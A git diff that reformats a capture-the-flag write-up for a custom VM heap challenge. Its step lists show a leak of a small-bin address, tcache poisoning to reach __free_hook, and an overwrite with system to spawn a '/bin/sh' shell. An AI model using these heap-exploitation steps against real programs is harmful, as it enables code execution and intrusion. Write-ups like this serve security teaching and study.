@@ -63,6 +63,7 @@ The VM memory resides in .bss, and is structured as below, stack entry is of siz
 ```
 
 Storage will be created through new(), each storage consists of one meta chunk and one data chunk, structured as below  
+
 **meta**
 ```
     |       8       |       8       |
@@ -98,14 +99,22 @@ The procedure would be something as below
 	* pad up storage index
 3. delete(S0)
 4. delete(S9)
-5. S0 = create(0x10)	# replace S0 with original S9 chunk
-6. S9 = create(0x10)	# malloc a chunk in the front of target chunk, and in Storage[9], so we can easily manipulate it
-7. push 0x40			# offset from S9\_ptr to unsorted\_chunk
-8. add*3				# add 0x40 to S9\_ptr
-9. (push 0x0)*2			# re-adjust stack\_top to stack\_buffer, so that printing stack won't be truncated
-10. push 10				# push a '\n' just for convenience, not necessary
-11. (extract S9[0x25-i])*6	# get small\_bin addr onto stack
-12. writestack			# print small\_bin address
+5. S0 = create(0x10)
+	* replace S0 with original S9 chunk
+6. S9 = create(0x10)
+	* malloc a chunk in the front of target chunk, and in Storage[9], so we can easily manipulate it
+7. push 0x40
+	* offset from S9\_ptr to unsorted\_chunk
+8. add*3
+	* add 0x40 to S9\_ptr
+9. (push 0x0)*2
+	* re-adjust stack\_top to stack\_buffer, so that printing stack won't be truncated
+10. push 10
+	* push a '\n' just for convenience, not necessary
+11. (extract S9[0x25-i])*6
+	* get small\_bin addr onto stack
+12. writestack
+	* print small\_bin address
 
 
 The heap would look something like this after adding 0x40 to Storage[9]\_ptr
@@ -127,7 +136,8 @@ The next step would be trying to hijack free\_hook to system so we can get shell
 
 
 Here is how I merge this trick into the original leaking payload, pay attention to just the difference
-1. S0 = create(0x10)	# a chunk close to our target chunk
+1. S0 = create(0x10)
+	* a chunk close to our target chunk
 2. S1 = create(0x500)
 3. S(2+i) = create(0x10) for i in range(8)
 4. delete(S1)
@@ -140,18 +150,29 @@ Here is how I merge this trick into the original leaking payload, pay attention 
 11. push 10
 12. (extract S9[0x25-i])*6
 13. writestack
-14. delete(S1)			# delete arbitrary non-critical storage, I'll settle with S1 here
-15. delete(S0)			# delete storage located right in front of S9, now *S0->data = S1\_ptr
-16. push 0x68			# offset from S0->data to S9\_ptr+0x40
-17. (sub)*3				# Now we have S9\_ptr = -(S0->data-0x8)
+14. delete(S1)
+	* delete arbitrary non-critical storage, I'll settle with S1 here
+15. delete(S0)
+	* delete storage located right in front of S9, now *S0->data = S1\_ptr
+16. push 0x68
+	* offset from S0->data to S9\_ptr+0x40
+17. (sub)*3
+	* Now we have S9\_ptr = -(S0->data-0x8)
 18. push 0x0
-19. sub					# This additional sub negates S9\_ptr, so now S9\_ptr = -(S0->data-0x8), consequently S9->data\_ptr = S1\_ptr
-20. read(S9)			# Hijack tcache\_list with free\_hook-0x8
-21. (push 0x0)*2		# re-adjust stack\_top to stack\_buffer
-22. S0 = create(0x10)	# take out top 2 chunks from tcache
-23. S1 = create(0x10)	# now we have S1->data\_ptr = free\_hook-0x8
-24. read(S1)			# read argument('/bin/sh') and &system onto free\_hook-0x8
-25. delete(S1)			# call system('/bin/sh')
+19. sub
+	* This additional sub negates S9\_ptr, so now S9\_ptr = -(S0->data-0x8), consequently S9->data\_ptr = S1\_ptr
+20. read(S9)
+	* Hijack tcache\_list with free\_hook-0x8
+21. (push 0x0)*2
+	* re-adjust stack\_top to stack\_buffer
+22. S0 = create(0x10)
+	* take out top 2 chunks from tcache
+23. S1 = create(0x10)
+	* now we have S1->data\_ptr = free\_hook-0x8
+24. read(S1)
+	* read argument('/bin/sh') and &system onto free\_hook-0x8
+25. delete(S1)
+	* call system('/bin/sh')
 
 The heap after hijacking tcache\_list looks like this
 ```
